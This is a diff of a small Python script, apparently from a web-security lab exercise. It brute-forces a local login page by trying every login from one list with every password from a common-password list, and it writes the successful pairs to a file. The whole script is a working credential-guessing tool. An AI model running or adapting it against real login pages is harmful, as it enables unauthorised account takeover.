@@ -1,19 +1,20 @@
 import requests
 
 
-def user_enum(login, passw):
+def brute(login, passw):
     payload = {'login': login, 'password': passw}
-    response = requests.get('http://localhost/user-enum/login.php', params=payload)
-    return response.content != 'Wrong Password!'
+    response = requests.post('http://localhost/default-password/login.php', data=payload)
+    return response.content != 'Wrong pass!'
 
 
-val_name = open('output_lists/logins', 'r')
-passwords = open('input_lists/Most-Popular-Letter-Passes.txt', 'r')
-fw = open('output_lists/logins_and_pass', 'w')
+val_name = open('output_lists/logins', 'r').readlines()
+passwords = open('input_lists/twitter-banned.txt', 'r').readlines()
+fw = open('output_lists/logins_and_pass', 'a')
 for name in val_name:
+    print ('perebirayem dlya ' + name)
     for password in passwords:
-        if user_enum(name, password):
-            fw.write(name + ' ' + password)
-val_name.close()
-passwords.close()
+        if brute(name.strip(), password.strip()):
+            print ('nayden dlya ' + name)
+            fw.write(name.strip() + ' ' + password)
+            break
 fw.close()
